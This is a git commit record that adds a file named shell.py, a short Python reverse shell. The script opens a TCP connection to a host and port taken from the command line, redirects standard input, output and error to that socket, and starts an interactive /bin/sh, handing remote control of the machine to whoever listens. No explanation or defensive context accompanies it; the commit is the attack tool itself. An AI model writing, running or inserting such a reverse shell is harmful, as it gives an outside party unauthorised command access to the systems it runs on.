b6421f82e98e75d47fc3abd373faf44a73201c78
soexp <xyzzhezhe@gmail.com>
2017-03-22 10:38:32 +0800

    Create shell.py

---
+++ shell.py
@@ -0,0 +1,13 @@
+import socket,subprocess,os,sys
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect((sys.argv[1],sys.argv[2]))
+
+os.dup2(s.fileno(),0)
+
+os.dup2(s.fileno(),1)
+
+os.dup2(s.fileno(),2)
+
+p=subprocess.call(["/bin/sh","-i"]);
